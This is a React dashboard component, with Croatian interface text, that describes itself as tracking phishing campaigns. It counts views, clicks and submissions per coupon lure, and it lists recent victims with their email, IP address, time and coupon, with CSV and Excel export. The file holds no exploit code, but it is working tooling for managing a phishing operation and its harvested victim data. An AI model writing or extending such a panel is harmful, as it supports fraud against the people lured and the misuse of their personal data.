import React, { useCallback, useEffect, useMemo, useState } from 'react';
import StatCard from '../components/StatCard';
import Chart from '../components/Chart';
import Table from '../components/Table';
import { fetchDashboardMetrics } from '../utils/api';
import { exportToCsv, exportToExcel } from '../utils/export';

const filtersContainer = {
  display: 'flex',
  gap: '12px',
  flexWrap: 'wrap',
  marginBottom: '24px'
};

const filterControl = {
  padding: '12px 16px',
  borderRadius: '12px',
  border: '1px solid rgba(148, 163, 184, 0.35)',
  background: '#ffffff',
  fontSize: '0.95rem'
};

const buttonPrimary = {
  padding: '12px 20px',
  borderRadius: '12px',
  border: 'none',
  background: 'linear-gradient(135deg, #0ea5e9 0%, #6366f1 100%)',
  color: '#ffffff',
  fontWeight: 600,
  cursor: 'pointer'
};

const buttonGhost = {
  padding: '12px 20px',
  borderRadius: '12px',
  border: '1px solid rgba(14,165,233,0.35)',
  background: 'transparent',
  color: '#0f172a',
  fontWeight: 600,
  cursor: 'pointer'
};

const cardsWrapper = {
  display: 'grid',
  gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))',
  gap: '20px',
  marginBottom: '28px'
};

const titleStyle = {
  fontSize: '1.6rem',
  fontWeight: 700,
  color: '#0f172a',
  marginBottom: '12px'
};

const subtitleStyle = {
  fontSize: '0.95rem',
  color: '#64748b',
  marginBottom: '32px'
};

const errorStyle = {
  background: 'rgba(239, 68, 68, 0.12)',
  border: '1px solid rgba(239, 68, 68, 0.3)',
  color: '#b91c1c',
  padding: '14px 18px',
  borderRadius: '12px',
  marginBottom: '18px'
};

const Dashboard = () => {
  const today = new Date();
  const defaultFrom = new Date();
  defaultFrom.setDate(today.getDate() - 7);

  const [filters, setFilters] = useState({
    from: defaultFrom.toISOString().slice(0, 10),
    to: today.toISOString().slice(0, 10),
    coupon: ''
  });
  const [appliedFilters, setAppliedFilters] = useState(filters);
  const [metrics, setMetrics] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const loadMetrics = useCallback(async (activeFilters) => {
    setLoading(true);
    setError('');
    try {
      const data = await fetchDashboardMetrics(activeFilters);
      setMetrics(data);
    } catch (err) {
      console.error('Failed to fetch dashboard metrics', err);
      setError(err.response?.data?.error || 'Neuspjelo dohvaćanje podataka.');
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    loadMetrics(appliedFilters);
  }, [appliedFilters, loadMetrics]);

  const normalized = useMemo(() => {
    const totals = {
      views: metrics?.totals?.views ?? metrics?.totalViews ?? 0,
      clicks: metrics?.totals?.clicks ?? metrics?.totalClicks ?? 0,
      submits: metrics?.totals?.submits ?? metrics?.totalSubmits ?? 0
    };

    const trend = metrics?.trend || metrics?.timeline || [];
    const topCoupons = metrics?.topCoupons || metrics?.coupons || [];
    const victims = metrics?.recentVictims || metrics?.victims || [];

    const couponOptions = metrics?.couponOptions || topCoupons?.map((c) => c.coupon || c.code) || [];

    return {
      totals,
      trend,
      topCoupons,
      victims,
      couponOptions: [...new Set(couponOptions.filter(Boolean))]
    };
  }, [metrics]);

  const handleApplyFilters = (event) => {
    event.preventDefault();
    setAppliedFilters(filters);
  };

  const handleResetFilters = () => {
    setFilters({
      from: defaultFrom.toISOString().slice(0, 10),
      to: today.toISOString().slice(0, 10),
      coupon: ''
    });
    setAppliedFilters({
      from: defaultFrom.toISOString().slice(0, 10),
      to: today.toISOString().slice(0, 10),
      coupon: ''
    });
  };

  const formatDateLabel = (value) => {
    if (!value) return '';
    const parsed = new Date(value);
    if (Number.isNaN(parsed.getTime())) {
      return value;
    }
    return parsed.toLocaleDateString();
  };

  const chartSeries = useMemo(() => {
    return [
      {
        name: 'Pregledi',
        data: normalized.trend.map((point) => ({
          label: formatDateLabel(point.date || point.label),
          value: point.views ?? point.impressions ?? 0
        }))
      },
      {
        name: 'Klikovi',
        data: normalized.trend.map((point) => ({
          label: formatDateLabel(point.date || point.label),
          value: point.clicks ?? 0
        }))
      },
      {
        name: 'Submisi',
        data: normalized.trend.map((point) => ({
          label: formatDateLabel(point.date || point.label),
          value: point.submits ?? point.conversions ?? 0
        }))
      }
    ];
  }, [normalized.trend]);

  const couponColumns = [
    { key: 'coupon', label: 'Kupon' },
    { key: 'views', label: 'Pregledi' },
    { key: 'clicks', label: 'Klikovi' },
    { key: 'submits', label: 'Submisi' },
    {
      key: 'conversionRate',
      label: 'Konverzija',
      render: (value, row) => {
        if (value !== undefined && value !== null) {
          return `${(Number(value) * 100).toFixed(1)}%`;
        }
        if (!row.clicks) {
          return '0%';
        }
        return `${((row.submits || 0) / row.clicks * 100).toFixed(1)}%`;
      }
    }
  ];

  const victimColumns = [
    { key: 'email', label: 'Email' },
    { key: 'ip', label: 'IP adresa' },
    {
      key: 'submittedAt',
      label: 'Vrijeme',
      render: (value) => formatDateLabel(value)
    },
    { key: 'coupon', label: 'Kupon' }
  ];

  const handleExportCoupons = (type) => {
    if (type === 'csv') {
      exportToCsv('dashboard-top-coupons', normalized.topCoupons, couponColumns);
    } else {
      exportToExcel('dashboard-top-coupons', normalized.topCoupons, couponColumns);
    }
  };

  const handleExportVictims = (type) => {
    if (type === 'csv') {
      exportToCsv('dashboard-recent-victims', normalized.victims, victimColumns);
    } else {
      exportToExcel('dashboard-recent-victims', normalized.victims, victimColumns);
    }
  };

  return (
    <div>
      <div style={titleStyle}>Pregled sustava</div>
      <div style={subtitleStyle}>
        Analiza ključnih metrika phishing kampanja, kupona i recentnih prijava žrtava.
      </div>

      {error && <div style={errorStyle}>{error}</div>}
      {loading && (
        <div style={{ marginBottom: '16px', color: '#64748b' }}>Učitavanje podataka...</div>
      )}

      <form style={filtersContainer} onSubmit={handleApplyFilters}>
        <div>
          <label style={{ display: 'block', fontSize: '0.8rem', color: '#64748b', marginBottom: '6px' }}>Od</label>
          <input
            type="date"
            value={filters.from}
            max={filters.to}
            onChange={(event) => setFilters((prev) => ({ ...prev, from: event.target.value }))}
            style={filterControl}
          />
        </div>
        <div>
          <label style={{ display: 'block', fontSize: '0.8rem', color: '#64748b', marginBottom: '6px' }}>Do</label>
          <input
            type="date"
            value={filters.to}
            min={filters.from}
            onChange={(event) => setFilters((prev) => ({ ...prev, to: event.target.value }))}
            style={filterControl}
          />
        </div>
        <div>
          <label style={{ display: 'block', fontSize: '0.8rem', color: '#64748b', marginBottom: '6px' }}>Kupon</label>
          <input
            type="text"
            list="coupon-options"
            placeholder="Sve kampanje"
            value={filters.coupon}
            onChange={(event) => setFilters((prev) => ({ ...prev, coupon: event.target.value }))}
            style={filterControl}
          />
          <datalist id="coupon-options">
            {normalized.couponOptions.map((option) => (
              <option key={option} value={option} />
            ))}
          </datalist>
        </div>
        <div style={{ display: 'flex', alignItems: 'flex-end', gap: '12px' }}>
          <button type="submit" style={buttonPrimary} disabled={loading}>
            {loading ? 'Filtriranje...' : 'Primijeni filtere'}
          </button>
          <button type="button" style={buttonGhost} onClick={handleResetFilters} disabled={loading}>
            Resetiraj
          </button>
        </div>
      </form>

      <div style={cardsWrapper}>
        <StatCard title="Pregledi" value={normalized.totals.views} />
        <StatCard title="Klikovi" value={normalized.totals.clicks} />
        <StatCard title="Submisi" value={normalized.totals.submits} />
      </div>

      <Chart title="Trend aktivnosti" series={chartSeries} />

      <div style={{ display: 'grid', gap: '24px', marginTop: '24px' }}>
        <section>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
            <div style={{ fontSize: '1.1rem', fontWeight: 600 }}>Top kuponi</div>
            <div style={{ display: 'flex', gap: '12px' }}>
              <button type="button" style={buttonGhost} onClick={() => handleExportCoupons('csv')}>
                CSV izvoz
              </button>
              <button type="button" style={buttonGhost} onClick={() => handleExportCoupons('excel')}>
                Excel izvoz
              </button>
            </div>
          </div>
          <Table columns={couponColumns} data={normalized.topCoupons} emptyMessage="Nema pronađenih kupona." />
        </section>
        <section>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
            <div style={{ fontSize: '1.1rem', fontWeight: 600 }}>Recentne žrtve</div>
            <div style={{ display: 'flex', gap: '12px' }}>
              <button type="button" style={buttonGhost} onClick={() => handleExportVictims('csv')}>
                CSV izvoz
              </button>
              <button type="button" style={buttonGhost} onClick={() => handleExportVictims('excel')}>
                Excel izvoz
              </button>
            </div>
          </div>
          <Table columns={victimColumns} data={normalized.victims} emptyMessage="Nema prijavljenih žrtava." />
        </section>
      </div>
    </div>
  );
};

export default Dashboard;
